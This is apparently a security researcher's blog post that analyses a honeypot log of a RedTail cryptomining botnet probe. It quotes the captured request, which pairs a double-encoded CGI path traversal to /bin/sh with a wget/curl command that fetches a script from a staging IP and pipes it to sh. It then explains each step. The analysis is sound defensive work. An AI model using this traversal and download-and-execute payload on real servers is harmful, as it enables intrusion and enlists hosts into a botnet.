---
title: "RedTail 2026 Cryptomining Botnet Campaign"
date: 2026-02-02
draft: false
description: "North Korean threat actor at it again"
tags: ["crypto", "mining", "botnet", "malware"]
categories: ["general"]
toc: false
---

## Background

I set my ICS/SCADA honeypot (Conpot) up mainly to try and analyze/monitor attacks on industrial systems (this one poses as a PLC for an HVAC system), however the majority of the attempts I've noticed have been opportunistic web-based attacks targeting the associated page on port 80.

Recently, I've noticed some similar looking attacks coming from Asia, both trying to connect to a C2 server.

## Log Analysis

Here is an example of one of the logs I captured:

```bash
2026-02-01 05:50:39,903 HTTP/1.1 POST request from ('101.36.123.102', 46080): 
Path: '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
Headers: [
    ('Host', '134.209.179.94:80'), 
    ('User-Agent', 'libredtail-http'), 
    ('Content-Type', 'text/plain'), 
    ('Content-Length', '119')
]
Payload: (wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh -s apache.selfrep
```

`101.36.123.102` is most likely a compromised system whose owner has zero idea their device is being used as part of a botnet. This is less interesting.

A couple of things did stand out to me, most notably the very suspicious looking User-Agent, `libredtail-http`. This user agent is associated with a known cryptomining malware: RedTail, whose staging server is the same one I noticed: `178[.]16[.]55[.]224`.

Otherwise, the use of `%%32$65` is also an immediate red flag. `%32%65` decodes to 2e, which is the hex for a dot `.`. This is a clever way to bypass filters that might be looking for `%2e` specifically by encoding the percent sign itself or hoping the parser "double-dips" the decoding.

`/cgi-bin/../../../../../../bin/sh` is the decoded path. A classic directory traversal attack, using multiple `../` to traverse up the directory tree, in an attempt to reach `/bin/sh` the system shell, so that it can execute arbitrary shell commands (fetching the malicious script from the staging server). The threat actor is also using the || (OR) command to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script.

You can also see that at the end, the command indicates that the script is intended to immediately begin scanning for other vulnerable Apache servers to continue infecting. This is the telltale sign of an attempt to add a vulnerable server to a botnet. In this case, the attackers are trying to recruit vulnerable web servers into mining crypto on their behalf.

